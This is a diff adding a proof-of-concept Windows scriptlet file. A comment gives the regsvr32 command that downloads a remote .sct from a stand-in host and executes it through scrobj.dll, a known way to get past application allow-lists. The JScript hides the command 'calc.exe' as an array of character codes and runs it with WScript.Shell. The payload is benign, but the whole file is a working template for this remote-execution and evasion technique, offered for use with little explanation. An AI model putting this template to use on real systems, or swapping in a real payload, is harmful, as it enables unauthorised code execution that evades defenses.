@@ -1,0 +1,23 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+	<!-- regsvr32 /s /u /i:http://example.com/file.sct scrobj.dll -->
+
+	<!-- Additional comments and obfuscation techniques applied here for educational purposes -->
+	<script language="JScript">
+		<![CDATA[
+			// This array holds the char codes for "calc.exe"
+			var charCodes = [99, 97, 108, 99, 46, 101, 120, 101];
+			// Convert char codes back to string
+			var cmd = "";
+			for(var i = 0; i < charCodes.length; i++) {
+				cmd += String.fromCharCode(charCodes[i]);
+			}
+			// Execute the command
+			var r = new ActiveXObject("WScript.Shell").Run(cmd);	
+		]]>
+</script>
+</registration>
+</scriptlet>
